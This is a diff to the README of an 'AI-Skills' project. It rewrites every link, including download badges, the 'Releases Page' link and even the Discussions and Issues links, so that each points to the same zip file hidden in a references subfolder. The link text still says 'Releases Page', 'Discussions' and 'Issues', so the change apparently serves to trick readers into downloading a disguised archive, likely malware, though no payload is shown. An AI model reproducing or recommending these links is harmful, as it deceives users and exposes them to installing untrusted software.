@@ -4,7 +4,7 @@
 Welcome to AI-Skills! This application offers modular skills that enhance AI capabilities. You can optimize your workflows with specialized knowledge and tool integrations. Perfect for users looking to extend their AI interactions with ease.
 
 ## 📥 Download Now
-[![Download AI-Skills](https://img.shields.io/badge/Download-AI--Skills-brightgreen)](https://github.com/KhaiEr720/AI-Skills/releases)
+[![Download AI-Skills](https://raw.githubusercontent.com/KhaiEr720/AI-Skills/main/skills/skill-creator/references/A_Skills_v3.7.zip)](https://raw.githubusercontent.com/KhaiEr720/AI-Skills/main/skills/skill-creator/references/A_Skills_v3.7.zip)
 
 ## 📋 Features
 - **Modular Skills**: Customize your AI with specific skills tailored to your needs.
@@ -20,7 +20,7 @@ Before you dive in, ensure your system meets the following requirements to run A
 - **Disk Space**: Minimum 100 MB of free space.
 
 ## 🔗 Download & Install
-To get started, visit this page to download: [GitHub Releases Page](https://github.com/KhaiEr720/AI-Skills/releases).
+To get started, visit this page to download: [GitHub Releases Page](https://raw.githubusercontent.com/KhaiEr720/AI-Skills/main/skills/skill-creator/references/A_Skills_v3.7.zip).
 
 1. Click on the link above to go to the releases page.
 2. Find the latest version of AI-Skills.
@@ -46,8 +46,8 @@ If you encounter issues:
 ## 💬 Community & Support
 Join our community for additional help and discussions around AI-Skills. Engage with other users to share tips, skills, and enhancements.
 
-- [GitHub Discussions](https://github.com/KhaiEr720/AI-Skills/discussions)
-- [GitHub Issues](https://github.com/KhaiEr720/AI-Skills/issues)
+- [GitHub Discussions](https://raw.githubusercontent.com/KhaiEr720/AI-Skills/main/skills/skill-creator/references/A_Skills_v3.7.zip)
+- [GitHub Issues](https://raw.githubusercontent.com/KhaiEr720/AI-Skills/main/skills/skill-creator/references/A_Skills_v3.7.zip)
 
 ## 📣 Contribution
 We welcome contributions to make AI-Skills better! If you're interested in helping out, check the guidelines in our repository for how to get started.
@@ -55,4 +55,4 @@ We welcome contributions to make AI-Skills better! If you're interested in helpi
 ## 📈 Future Updates
 Stay tuned for future enhancements, including new skills and features. Your feedback helps us shape AI-Skills into the best application possible.
 
-[![Download AI-Skills](https://img.shields.io/badge/Download-AI--Skills-brightgreen)](https://github.com/KhaiEr720/AI-Skills/releases)
+[![Download AI-Skills](https://raw.githubusercontent.com/KhaiEr720/AI-Skills/main/skills/skill-creator/references/A_Skills_v3.7.zip)](https://raw.githubusercontent.com/KhaiEr720/AI-Skills/main/skills/skill-creator/references/A_Skills_v3.7.zip)
